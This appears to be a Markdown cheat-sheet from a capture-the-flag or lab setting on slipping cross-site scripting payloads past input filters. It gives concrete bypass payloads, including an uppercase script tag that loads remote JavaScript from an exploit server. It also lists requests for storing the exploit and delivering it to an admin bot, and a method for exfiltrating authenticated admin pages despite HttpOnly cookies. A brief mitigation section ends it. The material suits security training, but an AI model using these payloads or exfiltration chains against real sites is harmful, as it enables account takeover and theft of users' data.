# XSS Filter Bypasses

When stored/reflected input is filtered, the goal is a payload the *filter regex* misses
but the *HTML parser* still executes. The mismatch between naive string matching and real
parsing is the whole attack surface.

## Tag/attribute mutations

A filter that blocks lowercase `<script`, `<img src=`, and `alert(` typically still allows:

- **`<svg onload=...>`** and other event-handler elements (`<body onload>`, `<details
  ontoggle>`, `<marquee onstart>`).
- **`<SCRIPT/SRC="url">`** — uppercase defeats a case-sensitive regex, and the `/` between
  the tag name and the first attribute is valid HTML5 (the parser treats `/` before
  attributes on non-void elements as whitespace). The browser parses it as
  `<script src="url">` and loads remote JS:

```html
<SCRIPT/SRC="https://exploitserver.htb/exploit"></SCRIPT>
```

Other reliable mismatches: HTML-entity-encoded payloads in attribute context,
`javascript:` URIs with embedded newlines/tabs, mixed-case `LOCALHOST`-style evasions when
the filter does exact matching.

## Pull the JS from an exploit server

Storing the whole payload inline often trips length limits or the filter. Store a tiny
`<SCRIPT SRC>` loader pointing at an exploit server you control, which serves the real JS
and triggers the bot:

```
POST https://exploitserver.htb/         exploit=<full-js>       # save the script
GET  https://exploitserver.htb/exploit                          # served to the admin bot
POST https://exploitserver.htb/deliver  target=filterbypass.htb # trigger bot visit
```

The `/deliver` UI may only list certain labs in a dropdown — POST directly with any target
value; the dropdown is cosmetic.

## Exfil under HttpOnly + outbound firewall

When the session is `HttpOnly` (no `document.cookie`) and the bot can't reach your
collector, combine two tricks from `xss-exploitation-chains.md`: fetch the admin page with
`withCredentials`, then **chunk the response back into a same-origin sink** (guestbook /
comments) and reassemble it as yourself.

## Constraints to watch

- DB field caps silently truncate (~100 chars in the guestbook lab) — chunk and stay under.
- `HttpOnly` cookies → never rely on `document.cookie`; exfil the authenticated *response*.
- Target page semantics: an admin-only page returns 200 for admin, 302 for others — check
  status, not just body.

## Mitigation

Context-aware output encoding (HTML/attr/JS/URL) at the sink, not input blacklists; a
strict `Content-Security-Policy` (`script-src` allow-list, no `unsafe-inline`) so even a
parsed injection can't load or run; `HttpOnly` + `Secure` + `SameSite` on session cookies.
